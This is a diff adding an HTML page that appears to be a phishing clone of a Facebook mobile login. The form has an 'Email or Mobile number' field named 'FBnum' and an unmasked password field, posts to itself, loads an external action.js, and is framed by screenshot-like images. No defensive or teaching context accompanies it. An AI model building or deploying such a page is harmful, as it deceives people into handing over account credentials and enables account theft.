@@ -1,0 +1,38 @@
+<html>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="" content="">
+<head>
+<style>
+html, body {margin:0; padding:0;
+font-family: arial;
+}
+.input, .submit{width: 100%; height: 40px; border: 1px solid black; }
+.input{outline:none; border:1px solid grey;}
+.submit{background-color: #7399e6; color: white; font-size: 12px; 
+margin-top: 4px;}
+img{width:100%;}
+label{color: #999999;}
+</style>
+
+</head>
+<body id="body">
+<img src="up.jpg">
+<form method="POST" id="form" style="width: 97%;margin:auto;">
+<label>
+Email or Mobile number<br>
+<input type="text" class="input" name="FBnum"></label>
+<br><label>Password<br>
+<input type="text" class="input" name="Password">
+</label><br>
+<input type="submit" style="border:none; border-radius:3px;" value="Log in" class="submit">
+</form>
+<script src="action.js"></script>
+<img src="down.jpg">
+<script>
+if(screen.width > 600)
+{
+document.getElementById('body').style.width = '60%';
+}
+</script>
+</body>
+</html>
